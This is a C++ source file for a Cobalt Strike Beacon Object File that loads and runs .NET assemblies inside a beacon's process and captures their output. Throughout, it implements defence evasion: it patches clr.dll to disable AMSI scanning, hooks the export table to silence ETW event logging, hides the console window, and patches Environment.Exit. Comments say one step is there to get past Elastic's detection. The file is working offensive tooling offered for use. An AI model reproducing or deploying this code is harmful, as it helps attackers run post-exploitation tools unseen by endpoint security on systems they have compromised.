#include <windows.h>
#include <stdio.h>
#include <unknwnbase.h>
#include <psapi.h>
#include <string.h>
#include "mscorlib.h"
#include "metahost.h"
#include "inline-ea.h"
#include "fcntl.h"

extern "C" {

#include "../_include/beacon.h"

#pragma warning(disable : 4996)

BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, PULONG OutputLength, BOOL patchExitflag, BOOL patchAmsiflag);
BOOL FindVersion(void* assembly, int length);
BOOL PatchAmsiScanBuffer(HMODULE hModule);
DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA);
BOOL DummyFunction(void);
BOOL patchExit(ICorRuntimeHost* runtimeHost);



int go(char* args, ULONG length)
{
	/* Get args from Aggressor Script
	datap parser;
	BeaconDataParse(&parser, args, length);
	PBYTE assemblyBytes = (PBYTE)BeaconDataExtract(&parser, NULL);
	DWORD assemblyByteLen = (DWORD)BeaconDataInt(&parser);
	LPCWSTR assemblyArguments = (wchar_t*)BeaconDataExtract(&parser, NULL);
	BOOL patchExitflag = BeaconDataInt(&parser);
	BOOL patchAmsiflag = BeaconDataInt(&parser);
	BOOL patchEtwflag = BeaconDataInt(&parser);
 	*/

	datap parser;
	BeaconDataParse(&parser, args, length);

    int assemblyByteLen = 0;
    PBYTE assemblyBytes = (PBYTE)BeaconDataExtract(&parser, &assemblyByteLen);
    LPCWSTR assemblyArguments = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	if (assemblyArguments == NULL) {
		// no STRING arg supplied will use empty string
		static wchar_t emptyArgs[] = L"";
		assemblyArguments = emptyArgs;
	}
	BOOL patchExitflag = false;
	BOOL patchAmsiflag = true;
	BOOL patchEtwflag = true;
	
	/* Allocate memory for output of .net assembly */
	LPSTR OutputBuffer = (LPSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100000);
	ULONG OutputLength = 0;
    
	/* Bypass ETW with EAT Hooking */
	if (patchEtwflag != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "EAT Hooking ETW");
		HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
		PVOID originalFunc = (PVOID)KERNEL32$GetProcAddress(advapi, "EventWrite");
		if (!EATHook(advapi, const_cast<char*>("EventWrite"), reinterpret_cast<VOID*>(&DummyFunction), reinterpret_cast<VOID**>(&originalFunc)))
			return -1;
	}
    
	/* Execute inline dotnet */
	Executedotnet(assemblyBytes, assemblyByteLen, assemblyArguments, &OutputBuffer, &OutputLength, patchExitflag, patchAmsiflag);

	/* Print results */
	BeaconPrintf(CALLBACK_OUTPUT, "[*] Assembly Output [%lu bytes]:\n%s", OutputLength, OutputBuffer);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, OutputBuffer);
	
	return 0;
}

BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, ULONG* OutputLength, BOOL patchExitflag, BOOL patchAmsiflag) // Heavily modified but credits to Maldev Academy and Anthemtotheego for the skeleton where I could then work on bypasses
{
    /* Debugging shenanigans
    BeaconPrintf(CALLBACK_OUTPUT, "Assembly Bytes Address: 0x%p", AssemblyBytes);
    BeaconPrintf(CALLBACK_OUTPUT, "Output Buffer Address: 0x%p", OutputBuffer);
    BeaconPrintf(CALLBACK_OUTPUT, "OutputLength Address: 0x%p", OutputLength);
    BeaconPrintf(CALLBACK_OUTPUT, "Output Length: %lu", *OutputLength);
    BeaconPrintfW(CALLBACK_OUTPUT, L"Arguments: %s", wAssemblyArguments);
	*/
	
	// --------- Here we initialize the CLR ---------
	HRESULT HResult = NULL;
	ICLRMetaHost* metaHost = NULL;
 
   	HResult = MSCOREE$CLRCreateInstance(xCLSID_CLRMetaHost, xIID_ICLRMetaHost, (PVOID*)&metaHost); // Spawns mscoreei.dll
    
	ICLRRuntimeInfo* runtimeInfo = NULL;
	LPCWSTR wVersion;
	if (FindVersion((void*)AssemblyBytes, AssemblySize))
	{
		wVersion = L"v4.0.30319";
	}
	else
	{
		wVersion = L"v2.0.50727";
	}
	
	HResult = metaHost->GetRuntime(wVersion, xIID_ICLRRuntimeInfo, (PVOID*)&runtimeInfo);

	BOOL IsLoadable;
	HResult = runtimeInfo->IsLoadable(&IsLoadable);
	if (HResult != S_OK || !IsLoadable)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "IsLoadable Failed!");
		return FALSE;
	}
	
	ICorRuntimeHost* runtimeHost = NULL; // ICorRuntimeHost has CreateDomain while ICLRRuntimeHost doesnt.
	
    	HMODULE phModDll = NULL;
	HRESULT hResult = MSCOREE$LoadLibraryShim(L"clr.dll", wVersion, NULL, &phModDll); // We LoadLibraryShim in order to have the callstack bypass Elastic's detection query. Once clr.dll is loaded, run GetInterface

	if (patchAmsiflag != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "Patching AMSI");
		BOOL Patch = PatchAmsiScanBuffer(phModDll);
		if (!Patch) {
			BeaconPrintf(CALLBACK_OUTPUT, "Failed to patch AMSI");
			return FALSE;
		}
	}

	HResult = runtimeInfo->GetInterface(xCLSID_CorRuntimeHost, xIID_ICorRuntimeHost, (PVOID*)&runtimeHost); // This will load clr.dll if we didn't LoadLibraryShim
	HResult = runtimeHost->Start();
    
    
    // --------- Here we create our AppDomain and pass the .net assembly into it ---------
	LPCWSTR pFriendlyName = L"SecureDomain";
	IUnknown* IUAppDomain = NULL;
	HResult = runtimeHost->CreateDomain((PWSTR)pFriendlyName, nullptr, &IUAppDomain); // Only accepts an IUnknown interface. Also, at the end we will unload the domain with this same ICorRuntimeHost interface
    
    	_AppDomain* AppDomain = NULL;
   	HResult = IUAppDomain->QueryInterface(xIID_AppDomain, (VOID**)&AppDomain); // Use the IUnknown interface's QueryInterface method to get a pointer to an interface we want; in our case _AppDomain AppDomain
      
	SAFEARRAYBOUND SafeArrayBound = { AssemblySize, 0 };
	SAFEARRAY* SafeAssembly = OLEAUT32$SafeArrayCreate(VT_UI1, 1, &SafeArrayBound); // Create safe array because Load_3 requires it as a safe array. https://learn.microsoft.com/en-us/archive/msdn-magazine/2017/march/introducing-the-safearray-data-structure#creating-a-safe-array
    
	MSVCRT$memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize); // now copy the bytes over into the safe array
    
	_Assembly* Assembly = NULL;
	HResult = AppDomain->Load_3(SafeAssembly, &Assembly); // Now using the AppDomain interface, load the specified assembly into the created appdomain (This will load amsi.dll) using the Load_3 method overload found in the mscorlib.h header file.
	if (HResult != S_OK)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[-] AppDomain->Load_3 Failed with Error: %lx", HResult); // This will fail if caught by AMSI
	}
	
	if (patchExitflag != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "Patching System.Environment.Exit");
	    if (!patchExit(runtimeHost))
	        return FALSE;
	}
	
    
	_MethodInfo* MethodInfo = NULL;
	HResult = Assembly->get_EntryPoint(&MethodInfo);
    
	SAFEARRAY* SafeExpected = { 0 };
	HResult = MethodInfo->GetParameters(&SafeExpected);
	
	
	// --------- Here we create arguments to be passed to the assembly entry point method ---------
	SAFEARRAY* SafeArguments = {};
	PWSTR* AssemblyArgv = {};
	if (SafeExpected)
	{
		if (SafeExpected->cDims && SafeExpected->rgsabound[0].cElements)
		{
			
			ULONG AssemblyArgc = {};
			VARIANT VariantArgv = {};
			

			SafeArguments = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, 1);

			if (MSVCRT$wcslen(wAssemblyArguments))
			{
				AssemblyArgv = SHELL32$CommandLineToArgvW(wAssemblyArguments, (PINT)&AssemblyArgc);
			}

			VariantArgv.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
			VariantArgv.vt = (VT_ARRAY | VT_BSTR);

			LONG Index = {};
			for (Index = 0; Index < AssemblyArgc; Index++)
			{
				OLEAUT32$SafeArrayPutElement(VariantArgv.parray, &Index, OLEAUT32$SysAllocString(AssemblyArgv[Index]));
			}

			Index = 0;
			OLEAUT32$SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
			OLEAUT32$SafeArrayDestroy(VariantArgv.parray);
		}
	}
	
	
	// --------- Here we invoke the assembly and retrieve output from it ---------
	/* We create an anonymous pipe to redirect the current executed assembly's output into a pipe for us to catch and store into a buffer */
	SECURITY_ATTRIBUTES SecurityAttr = {};
	HANDLE IoPipeRead = {};
	HANDLE IoPipeWrite = {};
	SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
	if (!(KERNEL32$CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, 0x100000))) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] CreatePipe Failed with Error: %lx", KERNEL32$GetLastError());
		HResult = KERNEL32$GetLastError();
	}
	
	/* This part was necessary in order to allocate a console from backed memory. I need to figure out how read output without allocating a console. */
    	KERNEL32$QueueUserAPC((PAPCFUNC)KERNEL32$AllocConsole, (HANDLE)-2, NULL);
    	typedef NTSTATUS(NTAPI* myNtTestAlert)();
	myNtTestAlert testAlert = (myNtTestAlert)(KERNEL32$GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	testAlert();
    
   	HWND ConHandle = {};
	if ((ConHandle = KERNEL32$GetConsoleWindow())) {
		USER32$ShowWindow(ConHandle, SW_HIDE); // To conceal the console window, we apply ShowWindow with the SW_HIDE parameter
	}

	HANDLE BackupHandle = KERNEL32$GetStdHandle(STD_OUTPUT_HANDLE);
	KERNEL32$SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite); // Then we set stdout to be directed to our anonymous pipe's write handle so it will be stored there and we can read from it later

	HResult = MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr); // Now call entry point with the arguments using the Invoke_3 method overload found in the mscorlib.h header file.

	if (!KERNEL32$ReadFile(IoPipeRead, *OutputBuffer, 0x100000, OutputLength, nullptr)) { // Read from the pipe to capture the output
		BeaconPrintf(CALLBACK_OUTPUT, "[-] ReadFile Failed with Error: %lx", KERNEL32$GetLastError());
	}
	
	// --------- From here on out we just clean up ---------
	if (BackupHandle)
		KERNEL32$SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle); //restore original std handle from backup 
	
	KERNEL32$CloseHandle(IoPipeRead);
	KERNEL32$CloseHandle(IoPipeWrite);
    	KERNEL32$FreeConsole();

	if (AssemblyArgv) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
		AssemblyArgv = nullptr;
	}

	if (SafeAssembly) {
		OLEAUT32$SafeArrayDestroy(SafeAssembly);
		SafeAssembly = nullptr;
	}

	if (SafeArguments) {
		OLEAUT32$SafeArrayDestroy(SafeArguments);
		SafeArguments = nullptr;
	}

	if (MethodInfo)
		MethodInfo->Release();
		
	if (Assembly)
	    Assembly->Release();
		
	HResult = runtimeHost->UnloadDomain(AppDomain);
	if (HResult != S_OK)
	    BeaconPrintf(CALLBACK_OUTPUT, "Failed to unload");
	
	if (AppDomain)
		AppDomain->Release();

    	if (IUAppDomain)
        	IUAppDomain->Release();

	if (runtimeHost)
		runtimeHost->Release();

	if (runtimeInfo)
		runtimeInfo->Release();

	if (metaHost)
		metaHost->Release();
	
	return TRUE;
	
}

// Determine if .NET assembly is v4 or v2
BOOL FindVersion(void* assembly, int length) // Credits to Anthemtotheego
{
	char* assembly_c;
	assembly_c = (char*)assembly;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}
	return 0;
}

/* Not using but keeping here just in case
void BeaconPrintfW(int type, const wchar_t* fmt, ...) // I think chatgpt cooked this up, I forgot
{
	wchar_t wideStr[MAX_PATH];
	char asciiStr[MAX_PATH];
	va_list args;
    	va_start(args, fmt);
	MSVCRT$_vsnwprintf_s(wideStr, MAX_PATH, _TRUNCATE, fmt, args);
	KERNEL32$WideCharToMultiByte(CP_ACP, 0, wideStr, -1, asciiStr, MAX_PATH, NULL, NULL);
	BeaconPrintf(type, asciiStr);
	va_end(args);
}
*/

// Patch clr.dll to bypass AMSI
BOOL PatchAmsiScanBuffer(HMODULE moduleHandle) // Credits: Practical Security Analytics LLC (lightly modified)
{
	HMODULE hModule = moduleHandle;
	typedef (WINAPI* fnGetModuleInformation)(HANDLE hProcess, HMODULE hModule, LPMODULEINFO lpmodinfo, DWORD cb);
	fnGetModuleInformation pGetModuleInformation = (fnGetModuleInformation)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("psapi.dll"), "GetModuleInformation");
	
	MODULEINFO modInfo;
	if (!pGetModuleInformation((HANDLE)-1, hModule, &modInfo, sizeof(modInfo)))
	    return FALSE;
	
	const char* targetString = "AmsiScanBuffer";
	int strLength = MSVCRT$strlen(targetString);
	
	PVOID foundAddress = NULL;
	PBYTE pModule = (PBYTE)hModule;
	for (size_t i = 0; i < modInfo.SizeOfImage - strLength; i++)
	{
		if (MSVCRT$memcmp(pModule+i, targetString, strLength) == 0)
		{
			foundAddress = pModule + i;
			break;
		}	
	}
		
	if (foundAddress == NULL)
		return TRUE; // Already patched

	DWORD oldProt;
	KERNEL32$VirtualProtect(foundAddress, strLength, PAGE_READWRITE, &oldProt);
	MSVCRT$memset(foundAddress, 0, strLength);
	KERNEL32$VirtualProtect(foundAddress, strLength, oldProt, &oldProt);

	return TRUE;
}


// Dummy function for EAT Hooking
#pragma optimize("", off)
BOOL DummyFunction(void) 
{
	return TRUE;
}
#pragma optimize("", on)


// EAT Hook for ETW bypass
DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA) // Credits: Jimster480 (modified)
{    
	if (!mod)
		return 0;
    
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)mod;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
    
	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)mod + dosHeader->e_lfanew);
	// Optionally check ntHeaders->Signature if needed

	DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (!exportRVA)
		return 0;

    
	IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mod + exportRVA);

	// Loop over the number of exported names instead of NumberOfFunctions
	for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
	{
		// Get the pointer to the name (RVA) and then convert it to an absolute address
		DWORD* nameRVA = (DWORD*)((BYTE*)mod + exportDir->AddressOfNames + (i * sizeof(DWORD)));
		char* currName = (char*)((BYTE*)mod + (*nameRVA));

		if (MSVCRT$strcmp(currName, FN) == 0)
		{
			// Get the corresponding ordinal from the NameOrdinals table
			WORD* ordinal = (WORD*)((BYTE*)mod + exportDir->AddressOfNameOrdinals + (i * sizeof(WORD)));
			// Now use the ordinal to get the function address from the AddressOfFunctions table
			DWORD* funcRVA = (DWORD*)((BYTE*)mod + exportDir->AddressOfFunctions + ((*ordinal) * sizeof(DWORD)));

			DWORD oldProtect;
			// Change memory protection to allow writing to the function pointer
			if (!KERNEL32$VirtualProtect(funcRVA, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
				return 0;

			// Save the original function address
			*OA = (void*)((BYTE*)mod + (*funcRVA));

			// Overwrite with our hook (relative address)
			*funcRVA = ((UINT64)HA - (UINT64)mod);

			// Restore original protection
			DWORD dummy;
			KERNEL32$VirtualProtect(funcRVA, sizeof(DWORD), oldProtect, &dummy);

			return 1;
		}
	}
	
	return 0;
}


// Patch System.Environment.Exit
BOOL patchExit(ICorRuntimeHost* runtimeHost) // Credits: Kyle Avery "Unmanaged .NET patching"
{
	IUnknown* appDomainUnk;
	runtimeHost->GetDefaultDomain(&appDomainUnk);

	_AppDomain* appDomain;
	appDomainUnk->QueryInterface(xIID_AppDomain, (VOID**)&appDomain);

	_Assembly* mscorlib;
	appDomain->Load_2(OLEAUT32$SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);



	_Type* exitClass;
	mscorlib->GetType_2(OLEAUT32$SysAllocString(L"System.Environment"), &exitClass);

	_MethodInfo* exitInfo;
	BindingFlags exitFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Static);
	exitClass->GetMethod_2(OLEAUT32$SysAllocString(L"Exit"), exitFlags, &exitInfo);




	_Type* methodInfoClass;
	mscorlib->GetType_2(OLEAUT32$SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);

	_PropertyInfo* methodHandleProp;
	BindingFlags methodHandleFlags = (BindingFlags)(BindingFlags_Instance | BindingFlags_Public);
	methodInfoClass->GetProperty(OLEAUT32$SysAllocString(L"MethodHandle"), methodHandleFlags, &methodHandleProp);

	VARIANT methodHandlePtr = { 0 };
	methodHandlePtr.vt = VT_UNKNOWN;
	methodHandlePtr.punkVal = exitInfo;

	SAFEARRAY* methodHandleArgs = OLEAUT32$SafeArrayCreateVector(VT_EMPTY, 0, 0);
	VARIANT methodHandleVal = { 0 };
	methodHandleProp->GetValue(methodHandlePtr, methodHandleArgs, &methodHandleVal);




	_Type* rtMethodHandleType;
	mscorlib->GetType_2(OLEAUT32$SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);

	_MethodInfo* getFuncPtrMethodInfo;
	BindingFlags getFuncPtrFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Instance);
	rtMethodHandleType->GetMethod_2(OLEAUT32$SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);

	SAFEARRAY* getFuncPtrArgs = OLEAUT32$SafeArrayCreateVector(VT_EMPTY, 0, 0);
	VARIANT exitPtr = { 0 };
	getFuncPtrMethodInfo->Invoke_3(methodHandleVal, getFuncPtrArgs, &exitPtr);



	DWORD oldProt = 0;
	BYTE patch = 0xC3;
	//BeaconPrintf(CALLBACK_OUTPUT, "[U] Exit function pointer: 0x%p\n", exitPtr.byref);
	KERNEL32$VirtualProtect(exitPtr.byref, 1, PAGE_READWRITE, &oldProt);
	MSVCRT$memcpy(exitPtr.byref, &patch, 1);
	KERNEL32$VirtualProtect(exitPtr.byref, 1, oldProt, &oldProt);

	return TRUE;
}

}
